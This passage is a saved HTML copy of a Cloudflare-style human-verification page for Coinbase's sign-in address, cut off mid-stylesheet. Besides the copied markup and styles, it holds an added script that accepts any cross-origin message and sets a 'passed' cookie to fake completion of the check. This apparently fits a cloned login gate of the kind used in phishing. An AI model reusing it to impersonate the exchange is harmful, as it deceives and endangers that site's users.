<!DOCTYPE html><html lang="en-US" class="lang-en-us"><head>
    <link rel="icon" data-savepage-href="https://www.coinbase.com/favicon.ico" href="data:image/vnd.microsoft.icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAA7EAAAOxAGVKw4bAAADGElEQVRYhbWXP1ATQRTGf3uTyjTXSH2pw2hotEzSZ0bSxM7BXg2MM5aG2EEDYawJKaEhw2id0NIYHai5GgvSYLsW7zbcXXZzB8avSfbP7ff27dvvvVXkhNbaB9aBKlABAsCPhqdACEyAEXCmlJrmXTuLONBa97TWt/ph6Gutg38h9rXWew8ktWEv8p4VyrVrxJWJHYyv4PxSfsPfEN5Iv1+ESgDPS7BRl/8phEBdKRVmGqC1rgCncfLxFXSP5TcPamXotKC2OmdEUyk1cRqQ3vn0Toj3v+cjTmOzIYb4xYQRCU/MDIjO6YchD2+guQuT68eRG1RKcPoJgpWEEWvmlnixuR1iO18GOcgazV1ZM0IQcTEzIHL9punsHi+HPG5E9yTRtWmuqIoMGABvAIYX0NxZvKBflEAz0T4JJUBju7Ri1E0E5oFSqq2is781vWsfZUEX2g3YTgYWIDFzNBbvuVArw+jLrDkFSh4ir7KT68Xk/Xew/3aeHCTItlsyx4XxFYwvZ00fWPeAuukZjNwfd1oiMlnYqMv1c+E8qSVVD3hmWq7d+8V85AadFvhP7GMpMasUiCmeK/Jr5cQ9zoRfhP57e1Cmji8ocJ9Smf6xL2jR9kysv8g1zfey5/xfFJDr4IO42WS4OBbdDBeGF+4jiHlnWkC0uQIQPLUbYETGdv1sCG/cYlYrJwwIPeDXbHDV9kmUFU/sYzYMxu6xWjnRnHhI+gWgWk5Pv8f+t8U6MSMfwfYCNXz1MtEcecAQiQNq5TkLE9j4KlJrO6bpHWwdyhwX4vkjwplJRj3gA8h51z+7F4GlJaMjpdRbY0AAzGRoqy8uXybaDckjMZSUUqEHEJVIB2ak03qc+LhQKUmiiuHAlGWLS7Kdx2lAmjxdkimlSqYxU8KoRqsjukCwIrl7UWbLQrsh556qBxNpLXdZvnWY3xu1MnRez92okKyyPGZEgOVhMrmWqudnVLiYqA9WREWrq86rHOJ4mDgRPc16S3ia9RY9zfIYEmitBw8kvY2Ig6z1rUfg8ghSP9aRKirA/jw/B4Z5n+d/AVicKcqgV4muAAAAAElFTkSuQmCC"><title>Just a moment...</title><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="robots" content="noindex,nofollow"><meta name="viewport" content="width=device-width,initial-scale=1"><style>*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131}button,html{font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji}@media (prefers-color-scheme:dark){body{background-color:#222;color:#d9d9d9}body a{color:#fff}body a:hover{color:#ee730a;text-decoration:underline}body .lds-ring div{border-color:#999 transparent transparent}body .font-red{color:#b20f03}body .pow-button{background-color:#4693ff;color:#1d1d1d}body #challenge-success-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=)}body #challenge-error-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+)}}body{display:flex;flex-direction:column;min-height:100vh}body.no-js .loading-spinner{visibility:hidden}body.no-js .challenge-running{display:none}body.dark{background-color:#222;color:#d9d9d9}body.dark a{color:#fff}body.dark a:hover{color:#ee730a;text-decoration:underline}body.dark .lds-ring div{border-color:#999 transparent transparent}body.dark .font-red{color:#b20f03}body.dark .pow-button{background-color:#4693ff;color:#1d1d1d}body.dark #challenge-success-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=)}body.dark #challenge-error-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+)}body.light{background-color:transparent;color:#313131}body.light a{color:#0051c3}body.light a:hover{color:#ee730a;text-decoration:underline}body.light .lds-ring div{border-color:#595959 transparent transparent}body.light .font-red{color:#fc574a}body.light .pow-button{background-color:#003681;border-color:#003681;color:#fff}body.light #challenge-success-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=)}body.light #challenge-error-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI2ZjNTc0YSIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjZmM1NzRhIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+)}a{background-color:transparent;color:#0051c3;text-decoration:none;transition:color .15s ease}a:hover{color:#ee730a;text-decoration:underline}.main-content{margin:8rem auto;max-width:60rem;width:100%}.heading-favicon{height:2rem;margin-right:.5rem;width:2rem}@media (width <= 720px){.main-content{margin-top:4rem}.heading-favicon{height:1.5rem;width:1.5rem}}.footer,.main-content{padding-left:1.5rem;padding-right:1.5rem}.main-wrapper{align-items:center;display:flex;flex:1;flex-direction:column}.font-red{color:#b20f03}.spacer{margin:2rem 0}.h1{font-size:2.5rem;font-weight:500;line-height:3.75rem}.h2{font-weight:500}.core-msg,.h2{font-size:1.5rem;line-height:2.25rem}.body-text,.core-msg{font-weight:400}.body-text{font-size:1rem;line-height:1.25rem}@media (width <= 720px){.h1{font-size:1.5rem;line-height:1.75rem}.h2{font-size:1.25rem}.core-msg,.h2{line-height:1.5rem}.core-msg{font-size:1rem}}#challenge-error-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI2ZjNTc0YSIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjZmM1NzRhIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+);padding-left:34px}#challenge-error-text,#challenge-success-text{background-repeat:no-repeat;background-size:contain}#challenge-success-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=);padding-left:42px}.text-center{text-align:center}.pow-button{background-color:#0051c3;border:.063rem solid #0051c3;border-radius:.313rem;color:#fff;font-size:.875rem;line-height:1.313rem;margin:2rem 0;padding:.375rem 1rem;transition-duration:.2s;transition-property:background-color,border-color,color;transition-timing-function:ease}.pow-button:hover{background-color:#003681;border-color:#003681;color:#fff;cursor:pointer}.footer{font-size:.75rem;line-height:1.125rem;margin:0 auto;max-width:60rem;width:100%}.footer-inner{border-top:1px solid #d9d9d9;padding-bottom:1rem;padding-top:1rem}.clearfix:after{clear:both;content:"";display:table}.clearfix .column{float:left;padding-right:1.5rem;width:50%}.diagnostic-wrapper{margin-bottom:.5rem}.footer .ray-id{text-align:center}.footer .ray-id code{font-family:monaco,courier,monospace}.core-msg,.zone-name-title{overflow-wrap:break-word}@media (width <= 720px){.diagnostic-wrapper{display:flex;flex-wrap:wrap;justify-content:center}.clearfix:after{clear:none;content:none;display:initial;text-align:center}.column{padding-bottom:2rem}.clearfix .column{float:none;padding:0;width:auto;word-break:keep-all}.zone-name-title{margin-bottom:1rem}}.loading-spinner{height:76.391px}.lds-ring{display:inline-block;position:relative}.lds-ring,.lds-ring div{height:1.875rem;width:1.875rem}.lds-ring div{animation:lds-ring 1.2s cubic-bezier(.5,0,.5,1) infinite;border:.3rem solid transparent;border-radius:50%;border-top-color:#313131;box-sizing:border-box;display:block;position:absolute}.lds-ring div:first-child{animation-delay:-.45s}.lds-ring div:nth-child(2){animation-delay:-.3s}.lds-ring div:nth-child(3){animation-delay:-.15s}@keyframes lds-ring{0%{transform:rotate(0)}to{transform:rotate(1turn)}}@media screen and (-ms-high-contrast:active),screen and (-ms-high-contrast:none){.main-wrapper,body{display:block}}.rtl .heading-favicon{margin-left:.5rem;margin-right:0}.rtl #challenge-success-text{background-position:100%;padding-left:0;padding-right:42px}.rtl #challenge-error-text{background-position:100%;padding-left:0;padding-right:34px}</style><meta http-equiv="refresh" content="375"><script data-savepage-type="" type="text/plain" data-savepage-src="/cdn-cgi/challenge-platform/h/b/orchestrate/chl_page/v1?ray=88a3126f4a216181"></script><script data-savepage-type="" type="text/plain" data-savepage-src="https://challenges.cloudflare.com/turnstile/v0/b/695da7821231/api.js?onload=gayxv3&render=explicit" async="" defer="" crossorigin="anonymous"></script>
    <style id="savepage-cssvariables">
      :root {
      }
    </style>
    <script>
      window.addEventListener('message', function(event) {
          if (event.data.action === 'navigate') {
              document.cookie = "passed=true; path=/";
              window.location.reload();
          }
      });
    </script>
    <meta name="savepage-url" content="https://www.coinbase.com/signin?return_to=/home">
    <meta name="savepage-title" content="Just a moment...">
    <meta name="savepage-pubdate" content="Unknown">
    <meta name="savepage-from" content="https://www.coinbase.com/signin?return_to=/home">
    <meta name="savepage-date" content="Sun May 26 2024 22:54:40 GMT-0500 (Central Daylight Time)">
    <meta name="savepage-state" content="Standard Items; Retain cross-origin frames; Merge CSS images; Remove unsaved URLs; Load lazy images in existing content; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;">
    <meta name="savepage-version" content="33.9">
    <meta name="savepage-comments" content="">
      </head><body class="no-js"><div class="main-wrapper" role="main"><div class="main-content"><h1 class="zone-name-title h1"><img data-savepage-currentsrc="https://www.coinbase.com/favicon.ico" data-savepage-src="/favicon.ico" src="data:image/vnd.microsoft.icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAA7EAAAOxAGVKw4bAAADGElEQVRYhbWXP1ATQRTGf3uTyjTXSH2pw2hotEzSZ0bSxM7BXg2MM5aG2EEDYawJKaEhw2id0NIYHai5GgvSYLsW7zbcXXZzB8avSfbP7ff27dvvvVXkhNbaB9aBKlABAsCPhqdACEyAEXCmlJrmXTuLONBa97TWt/ph6Gutg38h9rXWew8ktWEv8p4VyrVrxJWJHYyv4PxSfsPfEN5Iv1+ESgDPS7BRl/8phEBdKRVmGqC1rgCncfLxFXSP5TcPamXotKC2OmdEUyk1cRqQ3vn0Toj3v+cjTmOzIYb4xYQRCU/MDIjO6YchD2+guQuT68eRG1RKcPoJgpWEEWvmlnixuR1iO18GOcgazV1ZM0IQcTEzIHL9punsHi+HPG5E9yTRtWmuqIoMGABvAIYX0NxZvKBflEAz0T4JJUBju7Ri1E0E5oFSqq2is781vWsfZUEX2g3YTgYWIDFzNBbvuVArw+jLrDkFSh4ir7KT68Xk/Xew/3aeHCTItlsyx4XxFYwvZ00fWPeAuukZjNwfd1oiMlnYqMv1c+E8qSVVD3hmWq7d+8V85AadFvhP7GMpMasUiCmeK/Jr5cQ9zoRfhP57e1Cmji8ocJ9Smf6xL2jR9kysv8g1zfey5/xfFJDr4IO42WS4OBbdDBeGF+4jiHlnWkC0uQIQPLUbYETGdv1sCG/cYlYrJwwIPeDXbHDV9kmUFU/sYzYMxu6xWjnRnHhI+gWgWk5Pv8f+t8U6MSMfwfYCNXz1MtEcecAQiQNq5TkLE9j4KlJrO6bpHWwdyhwX4vkjwplJRj3gA8h51z+7F4GlJaMjpdRbY0AAzGRoqy8uXybaDckjMZSUUqEHEJVIB2ak03qc+LhQKUmiiuHAlGWLS7Kdx2lAmjxdkimlSqYxU8KoRqsjukCwIrl7UWbLQrsh556qBxNpLXdZvnWY3xu1MnRez92okKyyPGZEgOVhMrmWqudnVLiYqA9WREWrq86rHOJ4mDgRPc16S3ia9RY9zfIYEmitBw8kvY2Ig6z1rUfg8ghSP9aRKirA/jw/B4Z5n+d/AVicKcqgV4muAAAAAElFTkSuQmCC" class="heading-favicon" alt="Icon for www.coinbase.com">www.coinbase.com</h1><h2 id="challenge-running" class="h2">Verify you are human by completing the action below.</h2><div id="challenge-stage" style="display: flex;"><div id="turnstile-wrapper" class="spacer"><div><iframe srcdoc="<!DOCTYPE html><html lang=&quot;en-US&quot; class=&quot;lang-en-us&quot;><head><base href=&quot;&quot;>
        <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge,chrome=1&quot;>
        <meta name=&quot;robots&quot; content=&quot;noindex, nofollow&quot;>
        <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;>
        <link rel=&quot;preload&quot; data-savepage-href=&quot;/cdn-cgi/challenge-platform/h/b/cmg/1/hV7fTYrIy7e%2FC5FuCgYHr5Utjf5x6tY32TUpCSZd1P8%3D&quot; href=&quot;&quot; as=&quot;image&quot;>
        <title>Just a moment...</title>
        <style>@keyframes rotate {
      100% {
        transform: rotate(360deg);
      }
    }
    @keyframes stroke {
      100% {
        stroke-dashoffset: 0;
      }
    }
    @keyframes scale {
      0%, 100% {
        transform: none;
      }
      50% {
        transform: scale3d(1, 1, 1);
      }
    }
    @keyframes fill {
      100% {
        transform: scale(1);
      }
    }
    @keyframes fillfail {
      100% {
        box-shadow: inset 0 0 0 30px #c44d0e;
      }
    }
    @keyframes fillfail-offlabel {
      100% {
        box-shadow: inset 0 0 0 30px #1d1f20;
      }
    }
    @keyframes fillfail-offlabel-dark {
      100% {
        box-shadow: inset 0 0 0 30px #fff;
      }
    }
    @keyframes scale-up-center {
      0% {
        transform: scale(0.01);
      }
      100% {
        transform: scale(1);
      }
    }
    @keyframes unspin {
      40% {
        stroke-width: 1px;
        stroke-linecap: square;
        stroke-dashoffset: 192;
      }
      100% {
        stroke-width: 0;
      }
    }
    html {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
    }
    
    body {
      margin: 0;
      background-color: #fff;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      line-height: 17px;
      color: #1d1f20;
      font-family: -apple-system, system-ui, blinkmacsystemfont, &quot;Segoe UI&quot;, roboto, oxygen, ubuntu, &quot;Helvetica Neue&quot;, arial, sans-serif;
      font-size: 14px;
      font-weight: 400;
      -webkit-font-smoothing: antialiased;
      font-style: normal;
    }
    
    h1 {
      margin: 16px 0;
      text-align: center;
      line-height: 1.25;
      color: #1d1f20;
      font-size: 16px;
      font-weight: 700;
    }
    
    p {
      margin: 8px 0;
      text-align: center;
      font-size: 20px;
      font-weight: 400;
    }
    
    #content {
      display: flex;
      align-items: center;
      justify-content: space-between;
      border: 1px solid #e0e0e0;
      background-color: #fafafa;
      height: 63px;
      user-select: none;
    }
    
    #challenge-stage {
      display: flex;
    }
    
    #branding {
      display: flex;
      flex-direction: column;
      margin: 0 16px 0 0;
      text-align: right;
    }
    
    #spinner-icon {
      display: flex;
      margin-right: 8px;
      width: 30px;
      height: 30px;
      animation: rotate 5s linear infinite;
    }
    
    #fail-icon {
      display: flex;
      margin-right: 8px;
      border-radius: 50%;
      box-shadow: inset 0 0 0 #c44d0e;
      width: 30px;
      height: 30px;
      animation: fillfail 0.4s ease-in-out 0.4s forwards, scale 0.3s ease-in-out 0.9s both;
      stroke-width: 6px;
      stroke: #f8f8f8;
      stroke-miterlimit: 10;
    }
    
    #success-icon {
      display: flex;
      margin-right: 8px;
      border-radius: 50%;
      box-shadow: inset 0 0 0 #038127;
      width: 30px;
      height: 30px;
      animation: scale-up-center 0.6s cubic-bezier(0.55, 0.085, 0.68, 0.53) both;
      stroke-width: 6px;
      stroke: #f8f8f8;
      stroke-miterlimit: 10;
    }
    #success-icon .p1 {
      stroke-dasharray: 242;
      stroke-dashoffset: 242;
      box-shadow: inset 0 0 0 #038127;
      animation: stroke 0.4s cubic-bezier(0.65, 0, 0.45, 1) forwards;
      animation-delay: 0.5s;
    }
    
    .success-circle {
      stroke-dashoffset: 0;
      stroke-width: 2;
      stroke-miterlimit: 10;
      stroke: #038127;
      fill: #038127;
    }
    
    .theme-dark #success-icon {
      box-shadow: inset 0 0 0 #0aa937;
    }
    .theme-dark #success-icon .p1 {
      box-shadow: inset 0 0 0 #0aa937;
    }
    .theme-dark .success-circle {
      stroke: #0aa937;
      fill: #0aa937;
    }
    .theme-dark #challenge-overlay {
      background-color: #222;
    }
    .theme-dark #challenge-overlay,
    .theme-dark #challenge-error-text {
      color: #ffa299;
    }
    .theme-dark #challenge-overlay a,
    .theme-dark #challenge-error-text a {
      color: #bbb;
    }
    .theme-dark #challenge-overlay a:visited, .theme-dark #challenge-overlay a:link,
    .theme-dark #challenge-error-text a:visited,
    .theme-dark #challenge-error-text a:link {
      color: #bbb;
    }
    .theme-dark #challenge-overlay a:hover, .theme-dark #challenge-overlay a:active, .theme-dark #challenge-overlay a:focus,
    .theme-dark #challenge-error-text a:hover,
    .theme-dark #challenge-error-text a:active,
    .theme-dark #challenge-error-text a:focus {
      color: #949494;
    }
    .theme-dark .cb-lb .cb-i {
      border: 2px solid #dadada;
      background-color: #222;
    }
    .theme-dark .cb-lb input:focus ~ .cb-i, .theme-dark .cb-lb input:active ~ .cb-i {
      border: 2px solid #fbad41;
    }
    .theme-dark .cb-lb input:checked ~ .cb-i {
      background-color: #6d6d6d;
    }
    .theme-dark .cb-lb input:checked ~ .cb-i::after {
      border-color: #fbad41;
    }
    .theme-dark .offlabel #fail-icon {
      box-shadow: inset 0 0 0 #fff;
      animation: fillfail-offlabel-dark 0.4s ease-in-out 0.4s forwards, scale 0.3s ease-in-out 0.9s both;
    }
    .theme-dark h1 {
      color: #fff;
    }
    .theme-dark #challenge-error-title {
      color: #ffa299;
    }
    .theme-dark #challenge-error-title a {
      color: #bbb;
    }
    .theme-dark #challenge-error-title a:visited, .theme-dark #challenge-error-title a:link {
      color: #bbb;
    }
    .theme-dark #challenge-error-title a:hover, .theme-dark #challenge-error-title a:active, .theme-dark #challenge-error-title a:focus {
      color: #949494;
    }
    .theme-dark #terms {
      color: #bbb;
    }
    .theme-dark #terms a {
      color: #bbb;
    }
    .theme-dark #terms a:visited, .theme-dark #terms a:link {
      color: #bbb;
    }
    .theme-dark #terms a:hover, .theme-dark #terms a:active, .theme-dark #terms a:focus {
      color: #949494;
    }
    .theme-dark #content {
      border-color: #666;
      background-color: #222;
    }
    .theme-dark #qr {
      fill: rgb(243, 128, 32);
    }
    .theme-dark .logo-text {
      fill: #fff;
    }
    .theme-dark #fr-helper-link,
    .theme-dark #fr-helper-loop-link {
      color: #bbb;
    }
    .theme-dark #fr-helper-link:visited, .theme-dark #fr-helper-link:link,
    .theme-dark #fr-helper-loop-link:visited,
    .theme-dark #fr-helper-loop-link:link {
      color: #bbb;
    }
    .theme-dark #fr-helper-link:active, .theme-dark #fr-helper-link:hover, .theme-dark #fr-helper-link:focus,
    .theme-dark #fr-helper-loop-link:active,
    .theme-dark #fr-helper-loop-link:hover,
    .theme-dark #fr-helper-loop-link:focus {
      color: #949494;
    }
    .theme-dark #timeout-refresh-link,
    .theme-dark #expired-refresh-link {
      color: #bbb;
    }
    .theme-dark #timeout-refresh-link:visited, .theme-dark #timeout-refresh-link:link,
    .theme-dark #expired-refresh-link:visited,
    .theme-dark #expired-refresh-link:link {
      color: #bbb;
    }
    .theme-dark #timeout-refresh-link:active, .theme-dark #timeout-refresh-link:hover, .theme-dark #timeout-refresh-link:focus,
    .theme-dark #expired-refresh-link:active,
    .theme-dark #expired-refresh-link:hover,
    .theme-dark #expired-refresh-link:focus {
      color: #949494;
    }
    .theme-dark .overlay {
      border-color: #ffa299;
      color: #ffa299;
    }
    
    #challenge-error {
      margin: 0 8px;
    }
    
    #challenge-overlay {
      position: absolute;
      top: 0;
      z-index: 9999;
      background-color: #fafafa;
    }
    
    #challenge-overlay,
    #challenge-error-text {
      text-align: center;
      line-height: 10px;
      color: #de1303;
      font-size: 9px;
    }
    #challenge-overlay a,
    #challenge-error-text a {
      color: #1d1f20;
    }
    #challenge-overlay a:visited, #challenge-overlay a:link,
    #challenge-error-text a:visited,
    #challenge-error-text a:link {
      color: #1d1f20;
    }
    #challenge-overlay a:active, #challenge-overlay a:hover, #challenge-overlay a:focus,
    #challenge-error-text a:active,
    #challenge-error-text a:hover,
    #challenge-error-text a:focus {
      color: #166379;
    }
    
    #logo {
      margin-bottom: 1px;
      height: 26px;
    }
    
    .failure-circle {
      stroke-dasharray: 166;
      stroke-dashoffset: 166;
      stroke-width: 2;
      stroke-miterlimit: 10;
      stroke: #c44d0e;
      fill: none;
      animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
    }
    
    .failure-cross {
      transform-origin: 50% 50%;
      stroke-dasharray: 48;
      stroke-dashoffset: 48;
      animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
    }
    
    .cb-c {
      display: flex;
      align-items: center;
      margin-left: 11px;
      cursor: pointer;
      text-align: left;
    }
    
    .cb-lb {
      cursor: pointer;
      padding-left: 37px;
    }
    .cb-lb input {
      position: absolute;
      top: 20px;
      left: 18px;
      opacity: 0;
      z-index: 9999;
      cursor: pointer;
      width: 24px;
      height: 24px;
    }
    .cb-lb input:active ~ .cb-i {
      border: 2px solid #c44d0e;
    }
    .cb-lb input:active ~ span.cb-lb-t {
      text-decoration: underline;
    }
    .cb-lb input:focus ~ .cb-i {
      border: 2px solid #c44d0e;
    }
    .cb-lb input:focus ~ span.cb-lb-t {
      text-decoration: underline;
    }
    .cb-lb input:checked ~ .cb-i {
      transform: rotate(0deg) scale(1);
      opacity: 1;
      border-radius: 5px;
      background-color: white;
    }
    .cb-lb input:checked ~ .cb-i::after {
      top: 3px;
      left: 8px;
      transform: rotate(45deg) scale(1);
      border: solid #c44d0e;
      border-width: 0 4px 4px 0;
      border-radius: 0;
      width: 6px;
      height: 12px;
    }
    .cb-lb .cb-i {
      position: absolute;
      top: 20px;
      left: 18px;
      transition: all 0.1s ease-in;
      z-index: 9998;
      border: 2px solid #6d6d6d;
      border-radius: 3px;
      background: #fff;
      width: 24px;
      height: 24px;
      animation: scale-up-center 0.4s cubic-bezier(0.55, 0.085, 0.68, 0.53) both;
    }
    .cb-lb .cb-i::after {
      position: absolute;
      border-radius: 5px;
      content: &quot;&quot;;
    }
    
    .size-compact {
      font-size: 13px;
    }
    .size-compact .cb-lb .cb-i {
      left: 15px;
    }
    .size-compact .cb-lb input {
      left: 15px;
    }
    .size-compact #content {
      display: flex;
      flex-flow: column nowrap;
      place-content: center center;
      align-items: center;
      height: 118px;
    }
    .size-compact .link-spacer {
      margin-right: 3px;
      margin-left: 3px;
    }
    .size-compact .cb-c {
      text-align: left;
    }
    .size-compact #logo {
      margin-top: 5px;
      margin-bottom: 0;
      height: 22px;
    }
    .size-compact .cb-container {
      margin-top: 3px;
      margin-left: 0;
    }
    .size-compact #branding {
      display: flex;
      flex-flow: row-reverse wrap;
      place-content: center flex-start;
      align-items: center;
      margin: 5px 16px 0;
      padding-right: 0;
      text-align: right;
    }
    .size-compact #terms {
      text-align: right;
    }
    .size-compact #qr {
      text-align: center;
    }
    .size-compact #challenge-error-title {
      margin-top: 3px;
      width: auto;
    }
    .size-compact #fail {
      display: flex;
      flex-flow: row nowrap;
      place-content: center space-evenly;
      align-items: center;
      visibility: visible;
      line-height: 13px;
      font-size: 11px;
    }
    .size-compact #fail-icon {
      margin-right: 4px;
      width: 25px;
      height: 25px;
    }
